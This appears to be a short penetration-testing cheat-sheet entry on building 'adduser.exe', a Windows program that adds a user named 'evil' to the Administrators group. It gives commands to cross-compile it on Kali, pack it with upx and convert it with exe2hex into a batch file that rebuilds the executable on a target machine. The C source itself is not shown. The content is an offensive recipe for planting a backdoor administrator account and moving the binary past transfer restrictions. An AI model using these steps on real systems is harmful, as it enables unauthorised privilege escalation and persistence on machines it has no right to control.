# Create a Windows exe file that executes batch commands
In this example we will create adduser.exe 

## adduser.c
Source code that adds the new user "evil" to the group "Administrators"

## Compiling
To compile the c source code on kali

```bash
sudo i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

## Prepare for Windows
You need to compress the exe and convert it to a batch script that can spit out an exe

### Compression
Compress the .exe

```bash
upx -9 adduser.exe
```

### Convert the exe to hex and a batch file
Run this to spit out a batch file that you can run to recreate the file on a windows machine

```bash
exe2hex -x adduser.exe -p adduser.cmd
```

## Running on Windows
Simply run adduser.cmd on a Windows machine and adduser.exe will be created!
